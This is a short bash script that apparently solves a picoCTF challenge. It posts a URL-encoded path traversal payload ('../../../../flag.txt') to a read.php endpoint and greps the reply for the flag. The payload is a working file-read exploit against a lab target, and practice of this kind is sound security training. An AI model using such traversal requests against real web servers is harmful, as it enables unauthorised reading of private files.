# Clear dump
if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null

webLink=$1

response=$(curl "$webLink""read.php" \
                --silent \
                --data-raw 'filename=..%2F..%2F..%2F..%2Fflag.txt&read=')

flag=$(echo "$response" | grep -o --no-filename picoCTF{.*})

popd > /dev/null

# print the flag
echo $flag
